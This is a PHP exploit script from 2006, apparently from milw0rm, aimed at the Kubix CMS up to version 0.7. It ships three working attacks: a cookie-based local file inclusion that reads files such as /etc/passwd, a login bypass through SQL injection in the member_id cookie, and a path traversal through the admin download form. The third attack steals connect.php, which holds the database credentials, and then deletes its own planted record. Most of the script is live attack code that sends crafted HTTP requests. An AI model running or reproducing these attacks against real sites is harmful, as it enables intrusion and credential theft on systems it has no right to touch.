#!/usr/bin/php -q -d short_open_tag=on
<?
echo "\r\n";
echo "Kubix <=0.7 Multiple Vulnerabilities Exploit\r\n";
echo "Site: http://www.kubixproject.net\r\n";
echo "Dork: Powered by: Kubix\r\n";
echo "by BlackHawk <hawkgotyou@gmail.com>\r\n";
echo "Thanks to rgod for the php code and Marty for the Love\r\n\r\n";
if ($argc<4) {
echo "Usage: php ".$argv[0]." Site Path AttackType Related\r\n";
echo "Host:		target server (ip/hostname)\r\n";
echo "Path:		path to Kubix\r\n";
echo "AttackType:	1 - Local File Inclusion (mq=off)\r\n";
echo "		  |-> Related: path of the file to include\r\n";
echo "		  |-> Es: php ".$argv[0]." localhost /kubix/ 1 ../../../../../etc/passwd\r\n\r\n";
echo "		2 - Login Bypass (PoC)\r\n";
echo "		  |-> Related: Valid User ID (do nothing.. only to show how does it works)\r\n";
echo "		  |-> Es: php ".$argv[0]." localhost /kubix/ 2 1\r\n\r\n";
echo "		3 - Download connect.php file\r\n";
echo "		  |-> Related: Valid Admin User ID\r\n";
echo "		  |-> Es: php ".$argv[0]." localhost /kubix/ 3 1\r\n\r\n";
echo "";
echo "\r\n";
echo "";
die;
}

/*
There are some critical vulnerabilities in this quite pretty CMS..

Vuln N. 1 - Local File Inclusion:

vuln file: includes/head.php
code:
------
if(isset($_COOKIE['theme']) && $_COOKIE['theme'] != "")
{
	$default_theme = $_COOKIE['theme'];
}
[...]
include "themes/$default_theme/header.php";
?>
------

attacker can execute a LocalFile by setting the 'theme' cookie value properly;
Es: ../../../../../../etc/passwd%00
Becasuse of the last null char this one works only with MQ=off


Vuln N. 2 - Login Bypass:

vuln file: includes/functions.php
code:
------
// If the member_id cookie is set...
if(isset($_COOKIE['member_id']) && $_COOKIE['member_id'] != 0 && $_COOKIE['member_id'] != "")
{
	$id = $_COOKIE['member_id'];
	$pass_hash = $_COOKIE['pass_hash'];

	$sql = mysql_query("SELECT name FROM $members WHERE id = $id AND member_login_key = '$pass_hash'");
	$numrows = mysql_num_rows($sql);

	if($numrows != 1)
	{
		$isLoggedIn = "";
	}
	else
	{
		$isLoggedIn = 1;
	}
}
------
Attacker can Bypass login by setting 'member_id' cookie value properly and making a SQL Injection attack;

Es: 1--

Vuln N. 3 - connect.php (or what you want) file download:

vuln file: includes/adm/add_dl.php
code:
------
if(isset($_POST['Submit']) && $_POST['title'] != "" && $_POST['file'] != "" && $_POST['desc'] != "")
	{
		$title = $_POST['title'];
		$file = $_POST['file'];
		$desc = $_POST['desc'];
		$cat = $_POST['cats'];
		
		if(file_exists("Downloads/$file"))
		{
			mysql_query("INSERT INTO kbx_downloads (cat, name, `desc`, `file`) VALUES('$cat', '$title', '$desc', '$file')");
			echo '<div class="container center">Download added!<br />Redirecting...</div>';
			echo '<meta http-equiv="refresh" content="1;url=adm_index.php?mod=edit_dl">';
		}
		else
		{
			echo '<div class="alert">File Doesnt Exist!</div>';
			echo '<meta http-equiv="refresh" content="1;url=adm_index.php?mod=add_dl">';
		}
	}
------
Attacker with a valid Admin ID can send a malicious file name to download connect.php;
Es: ../includes/connect.php


Started programming: 15.37 28/11/2006
Ended:


sorry for my bad english but i've done it quicly cause Prof. Da Forno probably will defenestrate me in latin tomorrow :D

BlackHawk <hawkgotyou@gmail.com>
*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$attack_type=$argv[3];
$port=80;
$proxy="";


if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

switch($attack_type)
{
case 1: //Local file inclusion
$file_inc=$argv[4];
for ($i=5; $i<=$argc-1; $i++){
$file_inc.=" ".$argv[$i];
}
$file_inc = urlencode($file_inc).'%00';
echo "Attack No 1 - Local File Inclusion\r\n";
echo "-- Start of Result--\r\n";
$packet ="GET ".$p."index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: theme=".$file_inc.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
echo $html;
echo "\r\n-- End of Result--";
break;

case 2: // Login Bypass
$usr_id=$argv[4];
echo "Attack No 2 - Login Bypass\r\n";
$packet ="GET ".$p."index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: member_id=".$usr_id."--;\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
echo "Logged in.. But this is just a PoC..";
break;

break;
case 3: // connect.php download
$usr_id=$argv[4];
$data="title=DaForno_Imperat";
$data.="&file=../includes/connect.php";
$data.="&desc=BlackHawk_Rulez";
$data.="&Submit=Submit";
$packet="POST ".$p."adm_index.php?mod=add_dl HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Referer: http://".$host.$path."/blog.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: member_id=".$usr_id."--;\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$valid_id=0;

for ($i=0; $i<=50; $i++){
$packet ="GET ".$p."downloads.php?ID=".$i." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: member_id=".$usr_id."--;\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"DaForno_Imperat"))
{
$valid_id=$i;
}
}
$packet ="GET ".$p."downloads.php?act=dl&ID=".$valid_id." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: member_id=".$usr_id."--;\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("<?PHP",$html);
$temp2=explode("?>",$temp[1]);
echo "<?PHP\r\n".$temp2[0]."\r\n?>";
$packet ="GET ".$p."adm_index.php?mod=edit_dl&act=del&type=file&ID=".$valid_id." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: member_id=".$usr_id."--;\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
echo "\r\n\r\n\r\nAll Done.. Enjoy..";
break;
}
?>

# milw0rm.com [2006-11-29]